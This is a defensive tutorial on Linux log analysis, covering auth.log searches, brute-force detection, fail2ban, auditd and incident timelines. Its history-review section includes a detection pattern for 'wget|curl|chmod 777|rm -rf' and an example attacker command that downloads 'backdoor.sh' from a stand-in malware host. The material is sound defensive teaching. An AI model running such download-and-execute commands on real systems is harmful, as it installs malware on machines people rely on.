Linux Security Monitoring and Log Analysis (Ubuntu/Debian)
Linux systems record a large amount of security-related information in log files. By analyzing these logs, administrators and security analysts can detect unauthorized access attempts, brutecess, and sudo usage.
Monitoring these logs helps identify early indicators of compromise and allows administrators to respond quickly to potential threats.

Key Authentication Log Location
Log File	Purpose
/var/log/auth.log	Records login attempts, authentication failures, and sudo usage

                                        Example log entry:

Failed password for admin from 192.168.1.5 port 22 ssh2
This entry shows that someone attempted to log in as admin from the IP address 192.168.1.5 but failed.
Detecting Failed Login Attempts
A common sign of an attack is repeated failed login attempts.
Command:
                                                          sudo grep "Failed password" /var/log/auth.log

This command searches the authentication log for all failed password attempts.

Example output:
Failed password for root from 45.12.33.10
Failed password for admin from 103.21.55.10
These entries may indicate a brute-force attack, where an attacker tries many passwords until one works.

Identifying Brute Force Sources
To determine which IP addresses are responsible for the most failed login attempts, the following command can be used:
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

Example output:

150 185.220.101.5
40 192.168.1.20
10 45.77.89.2
Count	IP Address	Meaning
150	185.220.101.5	Likely brute force attacker
40	192.168.1.20	Possible suspicious activity
10	45.77.89.2	Normal login attempts
The IP with the highest count is usually the most suspicious.

Detecting Username Scanning
Attackers often attempt to discover valid usernames by trying common ones such as admin, root, test, or user.
Command:
sudo grep "invalid user" /var/log/auth.log
Example output:
Invalid user test from 103.21.55.10
Invalid user guest from 192.168.1.22
This type of activity is known as reconnaissance, where attackers gather information before launching a larger attack.
Monitoring Successful but Suspicious Logins
Not all successful logins are legitimate. Sometimes attackers manage to guess or steal credentials.
                                                   To view successful logins:

                                    sudo grep "Accepted password" /var/log/auth.log

Example:
Accepted password for karabo from 197.100.12.5
Security analysts also monitor logins that occur at unusual hours.
                                                Command:
                                                sudo grep "Accepted" /var/log/auth.log | grep -E "0[0-3]:[0-9]{2}:[0-9]{2}"
This command shows logins between midnight and 3 AM, which might be suspicious in a corporate environment.
Complete Login History

Linux maintains databases that store login records.
Commands:
                                               last -f /var/log/wtmp
Shows all login and logout activity.

                                            last -f /var/log/btmp
Shows failed login attempts.
Fail2ban is a security tool that monitors log files and automatically blocks IP addresses that repeatedly fail authentication.

Installation:
sudo apt-get install fail2ban
Start the service:
sudo systemctl start fail2ban
Check banned IPs:
sudo fail2ban-client status sshd
Tree diagram of how Fail2ban works:
Failed Login Attempts
        │
        ▼
Log File Monitoring
        │
        ▼
Fail2ban Detection
        │
        ▼
Firewall Rule Added
        │
        ▼
Attacker IP Blocked
Event Correlation and System Monitoring

Individual logs often provide only partial information. Security analysts correlate multiple logs to understand the full picture of an incident.

Log Category	Log Location	What It Monitors
Authentication	/var/log/auth.log	Login attempts and sudo usage
Package Changes	/var/log/dpkg.log	Software installations
System Events	/var/log/syslog	Services and kernel messages
Audit Logs	/var/log/audit/audit.log	File access and system calls
Timeline Reconstruction

During incident response, investigators create a timeline of events.

                                                                                Command:

                                                               sudo grep -h "May 15" /var/log/{auth.log,dpkg.log,syslog} | sort

Example timeline:
10:10 Failed login attempt
10:12 Successful login
10:13 Package installed

This determine how an attacker gained access and what actions they performed afterward.
Privilege Escalation Monitoring
Attackers often try to gain higher privileges after gaining access.
Track sudo usage:
sudo grep "sudo:" /var/log/auth.log
Track executed commands:
                           sudo grep "COMMAND=" /var/log/auth.log

Example:
karabo : COMMAND=/bin/bash
Unexpected sudo usage may indicate privilege escalation attempts.
File Integrity Monitoring with Auditd
auditd tracks changes to important system files.
Example rule:
sudo auditctl -w /etc/passwd -p wa -k passwd_changes
Search audit logs:
sudo ausearch -k passwd_changes

Tree diagram:

Critical File
      │
      ▼
Audit Rule Created
      │
      ▼
File Change Detected
      │
      ▼
Audit Log Recorded

This creates a record of who changed critical files and when.

Advanced Monitoring with eBPF

eBPF (Extended Berkeley Packet Filter) is a modern Linux technology that allows real-time monitoring of kernel events.
Advantages:
              High performance
              Low system overhead
              Real-time security monitoring
Used in cloud and container environments.
Suspicious Correlation Patterns
Certain event combinations strongly indicate malicious activity.
Event Combination	Possible Meaning
Failed logins + package installs	Attacker gained access and installed tools
Sudo usage + file deletions	Privilege escalation followed by evidence removal
Service restart + config change	Malicious configuration activated
Security Alert Validation

Not every alert means an attack has occurred. Analysts verify alerts through a validation process.

Important questions to ask yourself:
What happened?
When did it happen?
Which system is involved?
What is the system used for?
Who normally accesses it?
Checking Account Status
Check account status:
sudo passwd -S username
Check shadow file:
sudo grep "username" /etc/shadow

Symbols in the shadow file:

Symbol	Meaning
!	Account locked
*	Account disabled
Disk Space and Permissions

Disk Space and Permissions
Check disk usage:
df -h
Full disks can prevent authentication from working properly.
Check file permissions:
ls -l /etc/passwd /etc/shadow
Secure permissions:

/etc/passwd   -rw-r--r--
/etc/shadow   -rw-------
 

Security analysts also examine running processes.

Commands:

                                 ps aux | grep process_name
                                lsof -p PID
                                netstat -antup | grep PID

These commands reveal:
running processes
open files
network connections
Command History Analysis
Users’ command histories can reveal attacker activity.
View history:
cat /home/username/.bash_history
Search for suspicious commands:
grep -E "wget|curl|chmod 777|rm -rf" /home/*/.bash_history
Example:

wget http://malware.com/backdoor.sh
chmod 777 backdoor.sh

This could indicate malware installation.
